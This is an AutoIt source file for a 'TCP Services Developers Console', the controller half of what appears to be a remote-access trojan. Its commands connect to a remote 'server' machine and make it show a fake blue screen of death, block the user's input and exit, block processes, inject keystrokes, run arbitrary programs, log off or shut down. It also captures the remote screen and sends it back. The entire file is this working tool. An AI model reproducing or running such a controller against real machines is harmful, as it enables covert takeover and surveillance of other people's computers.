#include <guiconstants.au3>
#include <buttonconstants.au3>
#include <ListboxConstants.au3>
#include <windowsconstants.au3>
#include <GuiListBox.au3>
#include <EditConstants.au3>
#include <String.au3>
#include <SliderConstants.au3>
#include <ScreenCapture.au3>
#include <String.au3>
Opt("WinTitleMatchMode", 2)
Opt("Winsearchchildren", 1)
Opt("windetecthiddentext", 1)
Opt("TCPTimeout", 100)
Opt("TrayAutoPause", 0)
Opt("trayicondebug", 1)

TCPStartup()
$maingui = GUICreate("TCP Services Developers Console", @DesktopWidth - 20, @DesktopHeight - 80, 10, 10, BitOR($GUI_SS_DEFAULT_GUI, $WS_SIZEBOX))
$list = GUICtrlCreateList("1.) TCP Services Developers Console...", 10, 10, @DesktopWidth - 40, @DesktopHeight - 140, BitOR($WS_BORDER, $WS_VSCROLL, $WS_HSCROLL, $LBS_NOSEL, $LBS_DISABLENOSCROLL))
_GUICtrlListBox_SetHorizontalExtent($list, 5000)
$number = "2"
$admin = "0"
$connected = "no"
$username = @UserName
$connected = 0
$input = GUICtrlCreateInput("", 10, @DesktopHeight - 120, @DesktopWidth - 40, 20)
GUISetState()

While 1
	$msg = GUIGetMsg()
	Select
		Case $msg = $GUI_EVENT_CLOSE
			Exit 0
		Case $msg = $input
			$inputread = GUICtrlRead($input)
			If $inputread = "Info" Then
				_addtolist("Application information:")
				_addtolist("    TCP Services Developers Console")
				_addtolist("    Version 1.0.0.0")
				_addtolist("    Compatible with version 1.3.3.1 of TCP Services")
				_addtolist("    Programmed in Autoit by Subzerostig")
				_addtolist("    BSOD made by Matthieuautoitscripter")
			ElseIf $inputread = "ChangeAdmin" Then
				_clearinput()
				_addtolist("Enter admin level...")
				While 1
					If GUIGetMsg() = $input Then
						$admin = GUICtrlRead($input)
						ExitLoop
					EndIf
				WEnd
				_addtolist("Your admin level has been changed to: " & $admin)
			ElseIf $inputread = "ChangeUsername" Then
				_clearinput()
				_addtolist("Enter username...")
				While 1
					If GUIGetMsg() = $input Then
						$username = GUICtrlRead($input)
						ExitLoop
					EndIf
				WEnd
				_addtolist("Your username has been changed to: " & $username)
			ElseIf $inputread = "Commands" Then
				_addtolist("List of Commands")
				_addtolist("    ChangeAdmin - changes security level")
				_addtolist("    ChangeUsername - changes your username")
				_addtolist("    Commands - Displays available commands")
				_addtolist("    Connect - Connects up to a server")
				_addtolist("    ConnectionData - displays connection data")
				_addtolist("    Disconnect - Disconnects from a connected server")
				_addtolist("    Exit - exits application, disconnecting safely")
				_addtolist("    GetIP - Retrieves computer IP")
				_addtolist("    Info - Displays application information")
				_addtolist("    Message - Message a connected server")
				_addtolist("    RefreshConnection - Resends data to server")
				_addtolist("    SendFunc - sends a function to the server:")
				_addtolist("    ==> BlockExit - blocks server from exiting")
				_addtolist("    ==> BlockInput - blocks server input")
				_addtolist("    ==> BlockProcess - blocks a process on the server")
				_addtolist("    ==> Bsod - initiates blue screen of death on server")
				_addtolist("    ==> ChangeRes- Changes the screen resolution")
				_addtolist("    ==> Logoff - logs off the server")
				_addtolist("    ==> Sendkeys - simulates key presses on server")
				_addtolist("    ==> ShellExecute - starts process/open webpage")
				_addtolist("    ==> ShowScreen - shows screen (note: does not send all data. Very glitchy)")
				_addtolist("    ==> Shutdown - shuts down the server")
				_addtolist("    ==> UnblockExit - unblocks server from exiting")
				_addtolist("    ==> UnblockInput - unblocks server input")
				_addtolist("    ==> Unbsod - closes blue screen of death on server")
			ElseIf $inputread = "Connect" Then
				_addtolist("Enter Ip to connect to...")
				_clearinput()
				While 1
					If GUIGetMsg() = $input Then
						$ip = GUICtrlRead($input)
						ExitLoop
					EndIf
				WEnd
				_addtolist("Enter Port to connect to...")
				_clearinput()
				While 1
					If GUIGetMsg() = $input Then
						$port = GUICtrlRead($input)
						ExitLoop
					EndIf
				WEnd
				_addtolist("Connecting please wait...")
				_clearinput()
				$result = TCPConnect($ip, $port)
				Sleep(250)
				If $result = -1 Or 0 Then
					_addtolist("Error connecting. Error Code: " & @error)
				Else
					_addtolist("Verifying ID...")
					$sent = TCPSend($result, "-**-identification-**-")
					If $sent = 0 Then
						_addtolist("Error. Error Code: " & @error)
					Else
						_addtolist("Sending key...")
						$encryptionkey = Random("1", "9999", 1)
						$sent = TCPSend($result, _StringEncrypt(1, $encryptionkey, "-**-key-**-", 5))
						If $sent = 0 Then
							_addtolist("Error. Error Code: " & @error)
						Else
							Sleep(500)
							_addtolist("Sending Username. " & $username)
							$sent = _esend($username)
							If $sent = 0 Then
								_addtolist("Error. Error Code: " & @error)
							Else
								Sleep(500)
								_addtolist("Sending Admin level. Level " & $admin)
								$sent = _esend($admin)
								If $sent = 0 Then
									_addtolist("Error. Error Code: " & @error)
								Else
									_addtolist("Connected")
									$connected = 1
									$connectedip = $ip
									$connectedport = $port
									$connectedkey = $encryptionkey
									$connectedadmin = $admin
									$connectedusername = $username
								EndIf
							EndIf
						EndIf
					EndIf
				EndIf
			ElseIf $inputread = "ConnectionData" Then
				If $connected = 1 Then
					_addtolist("Connection Data:")
					_addtolist("    IP: " & $connectedip)
					_addtolist("    PORT: " & $connectedport)
					_addtolist("    KEY: " & $connectedkey)
					_addtolist("    USERNAME: " & $connectedusername)
					_addtolist("    ADMIN LEVEL: " & $connectedadmin)
				Else
					_addtolist("Error: Not connected")
				EndIf
			ElseIf $inputread = "Disconnect" Then
				_clearinput()
				_addtolist("Disconnecting...")
				If $connected = 1 Then
					$sent = _esend("-**-dis-connect-**-")
					If $sent = 0 Then
						_addtolist("Error. Error Code: " & @error)
						_addtolist("Connection has been nullified however connection may still exist")
					Else
						_addtolist("Disconnected")
					EndIf
				Else
					_addtolist("Error: Not connected")
				EndIf
				$connected = 0
			ElseIf $inputread = "Exit" Then
				If $connected = 1 Then
					_addtolist("Disconnecting...")
					$sent = _esend("-**-dis-connect-**-")
					If $sent = 0 Then
						_addtolist("Error. Error Code: " & @error)
						_addtolist("Connection has been nullified however connection may still exist")
					Else
						_addtolist("Disconnected")
					EndIf
				EndIf
				_addtolist("Exiting...")
				Exit 0
			ElseIf $inputread = "GetIP" Then
				_addtolist("IP Address: " & @IPAddress1)
			ElseIf $inputread = "Message" Then
				If $connected = 1 Then
					_addtolist("Enter data to send...")
					_clearinput()
					While 1
						If GUIGetMsg() = $input Then
							$data = GUICtrlRead($input)
							ExitLoop
						EndIf
					WEnd
					_clearinput()
					$sent = _esend($data)
					If $sent = 0 Then
						_addtolist("Error. Error Code: " & @error)
					Else
						_addtolist("Message sent")
					EndIf
				Else
					_addtolist("Error: Not connected")
				EndIf
			ElseIf $inputread = "RefreshConnection" Then
				_addtolist("Refreshing connection...")
				$sent = _esend("-**-changeid-**-")
				If $sent = 0 Then
					_addtolist("Error: Error code: " & @error)
				EndIf
				Sleep(100)
				_addtolist("Sending username: " & $username)
				$sent = _esend($username)
				If $sent = 0 Then
					_addtolist("Error: Error code: " & @error)
				EndIf
				Sleep(100)
				_addtolist("Sending security level: " & $admin)
				$sent = _esend($admin)
				If $sent = 0 Then
					_addtolist("Error: Error code: " & @error)
				EndIf
				$connectedadmin = $admin
				$connectedusername = $username
				_addtolist("Connection refreshed")
			ElseIf $inputread = "SendFunc" Then
				_clearinput()
				If $connected = 1 Then
					_addtolist("Enter function to send")
					While 1
						If GUIGetMsg() = $input Then
							$data = GUICtrlRead($input)
							ExitLoop
						EndIf
					WEnd
					Switch $data
						Case "BlockExit"
							_addtolist("Sending function key")
							$sent = _esend("-**-block-exit-**-")
							If $sent = 0 Then
								_addtolist("Error: Error code " & @error)
							Else
								_addtolist("Exit has been blocked")
							EndIf
						Case "BlockInput"
							_addtolist("Sending function key")
							$sent = _esend("-**-block-input-**-")
							If $sent = 0 Then
								_addtolist("Error: Error code " & @error)
							Else
								_addtolist("Input has been blocked")
							EndIf
						Case "BlockProcess"
							_clearinput()
							_addtolist("Enter process to block")
							While 1
								If GUIGetMsg() = $input Then
									$data = GUICtrlRead($input)
									ExitLoop
								EndIf
							WEnd
							_addtolist("Sending Function key")
							$sent = _esend("-**-block-process-add-**-")
							If $sent = 0 Then
								_addtolist("Error: Error code " & @error)
							Else
								Sleep(250)
								_addtolist("Sending process")
								$sent = _esend($data)
								If $sent = 0 Then
									_addtolist("Error: Error code " & @error)
								Else
									_addtolist("Process blocked")
								EndIf
							EndIf
						Case "Bsod"
							_addtolist("Sending function key")
							$sent = _esend("-**-bsod-**-")
							If $sent = 0 Then
								_addtolist("Error: Error code " & @error)
							Else
								_addtolist("Blue screen of death has initialized")
							EndIf
						Case "ChangeRes"
							_clearinput()
							_addtolist("Enter width...")
							While 1
								If GUIGetMsg() = $input Then
									$width = GUICtrlRead($input)
									ExitLoop
								EndIf
							WEnd
							_clearinput()
							_addtolist("Enter height...")
							While 1
								If GUIGetMsg() = $input Then
									$height = GUICtrlRead($input)
									ExitLoop
								EndIf
							WEnd
							_clearinput()
							_addtolist("Sending function key")
							$sent = _esend("-**-change-res-**-")
							If $sent = 0 Then
								_addtolist("Error: Error code " & @error)
							Else
								Sleep(150)
								_addtolist("Sending screen width")
								$sent = _esend($width)
								If $sent = 0 Then
									_addtolist("Error: Error code " & @error)
								Else
									_addtolist("Sending screen height")
									$sent = _esend($height)
									If $sent = 0 Then
										_addtolist("Error: Error code " & @error)
									Else
										_addtolist("Resolution changed")
									EndIf
								EndIf
							EndIf
						Case "Logoff"
							_addtolist("Sending function key")
							$sent = _esend("-**-log-off-**-")
							If $sent = 0 Then
								_addtolist("Error: Error code " & @error)
							Else
								_addtolist("Logged off")
							EndIf
						Case "Sendkeys"
							_clearinput()
							_addtolist("Enter raw keys to send")
							While 1
								If GUIGetMsg() = $input Then
									$data = GUICtrlRead($input)
									ExitLoop
								EndIf
							WEnd
							_addtolist("Sending function key")
							$sent = _esend("-**-send-keys-**-")
							If $sent = 0 Then
								_addtolist("Error: Error code " & @error)
							Else
								Sleep(250)
								_addtolist("Sending keys")
								$sent = _esend($data)
								If $sent = 0 Then
									_addtolist("Error: Error code " & @error)
								Else
									_addtolist("Keys sent")
								EndIf
							EndIf
						Case "ShellExecute"
							_clearinput()
							_addtolist("Enter process to run/webpage to open...")
							While 1
								If GUIGetMsg() = $input Then
									$data = GUICtrlRead($input)
									ExitLoop
								EndIf
							WEnd
							_addtolist("Sending function key")
							$sent = _esend("-**-shell-execute-**-")
							If $sent = 0 Then
								_addtolist("Error: Error code " & @error)
							Else
								Sleep(250)
								_addtolist("Sending process/webpage")
								$sent = _esend($data)
								If $sent = 0 Then
									_addtolist("Error: Error code " & @error)
								Else
									_addtolist("Process ran/webpage opened")
								EndIf
							EndIf
						Case "ShowScreen"
							_clearinput()
							$showscreenerror = _showscreen()
							If $showscreenerror = -1 Then
								Switch @error
									Case 1
										_addtolist("The connection timed out")
									Case 2
										_addtolist("Please enter a valid jpg quality")
									Case Else
										_addtolist("Error: Error code " & @error)
								EndSwitch
							EndIf
						Case "Shutdown"
							_addtolist("Sending function key")
							$sent = _esend("-**-shut-down-**-")
							If $sent = 0 Then
								_addtolist("Error: Error code " & @error)
							Else
								_addtolist("shut down")
							EndIf
						Case "UnblockExit"
							_addtolist("Sending function key")
							$sent = _esend("-**-unblock-exit-**-")
							If $sent = 0 Then
								_addtolist("Error: Error code " & @error)
							Else
								_addtolist("Exit has been unblocked")
							EndIf
						Case "UnblockInput"
							_addtolist("Sending function key")
							$sent = _esend("-**-unblock-input-**-")
							If $sent = 0 Then
								_addtolist("Error: Error code " & @error)
							Else
								_addtolist("Input has been unblocked")
							EndIf
						Case "UnBsod"
							_addtolist("Sending function key")
							$sent = _esend("-**-unbsod-**-")
							If $sent = 0 Then
								_addtolist("Error: Error code " & @error)
							Else
								_addtolist("Blue screen of death has been closed")
							EndIf
						Case Else
							_addtolist("Error: Function not recognised")
					EndSwitch
				Else
					_addtolist("Error: Not connected")
				EndIf
			Else
				_addtolist("The command '" & $inputread & "' could not be found. Type in commands for a list of commands")
			EndIf
			_clearinput()
	EndSelect
WEnd

Func _addtolist($atl_input)
	GUICtrlSetData($list, $number & ".) " & $atl_input)
	$number = $number + 1
	_GUICtrlListBox_SetCurSel($list, _GUICtrlListBox_GetCount($list) - 1)
EndFunc   ;==>_addtolist

Func _esend($messagetoencyptsend)
	$tcp_encryptionresult = TCPSend($result, _StringEncrypt(1, $messagetoencyptsend, $encryptionkey, 1))
	Return $tcp_encryptionresult
EndFunc   ;==>_esend

Func _clearinput()
	GUICtrlSetData($input, "")
EndFunc   ;==>_clearinput

Func _showscreen()
	_clearinput()
	_addtolist("Enter .jpg quality (1-100)")
	While 1
		If GUIGetMsg() = $input Then
			$showscreenquality = GUICtrlRead($input)
			ExitLoop
		EndIf
	WEnd
	_clearinput()
	If $showscreenquality < 1 Or $showscreenquality > 100 Then
		SetError(2)
		Return -1
	EndIf
	Global $timerhandle = TimerInit()
	_addtolist("Creating server for .jpg...")
	Global $tempsocket = TCPListen(@IPAddress1, "54321")
	If $tempsocket = -1 Or $tempsocket = 0 Then
		SetError(3)
		Return -1
	EndIf
	_addtolist("Sending function key")
	$sent = _esend("-**-show-screen-**-")
	If $sent = 0 Then
		SetError(@error)
		Return -1
	EndIf
	Sleep(150)
	_addtolist("Sending IP address")
	$sent = _esend(@IPAddress1)
	If $sent = 0 Then
		SetError(@error)
		Return -1
	EndIf
	Sleep(150)
	_addtolist("Sending .jpg quality")
	$sent = _esend($showscreenquality)
	If $sent = 0 Then
		SetError(@error)
		Return -1
	EndIf
	_addtolist("Waiting for server to connect")
	Do
		Global $tempaccept = TCPAccept($tempsocket)
	Until $tempaccept <> -1 Or TimerDiff($timerhandle) > 5000
	If TimerDiff($timerhandle) > 5000 Then
		SetError(1)
		Return -1
	EndIf
	If FileExists(@TempDir & "\tcp services show screen.jpg") Then
		FileDelete(@TempDir & "\tcp services show screen.jpg")
	EndIf
	_addtolist("receiving file")
	Do
		$temprecv = TCPRecv($tempaccept, 100000000)
	Until $temprecv <> "" Or TimerDiff($timerhandle) > 5000
	If TimerDiff($timerhandle) > 5000 Then
		SetError(1)
		Return -1
	EndIf
	FileWrite(@TempDir & "\tcp services show screen.jpg", $temprecv)
	TCPCloseSocket($tempsocket)
	ShellExecute(@TempDir & "\tcp services show screen.jpg")
EndFunc   ;==>_showscreen
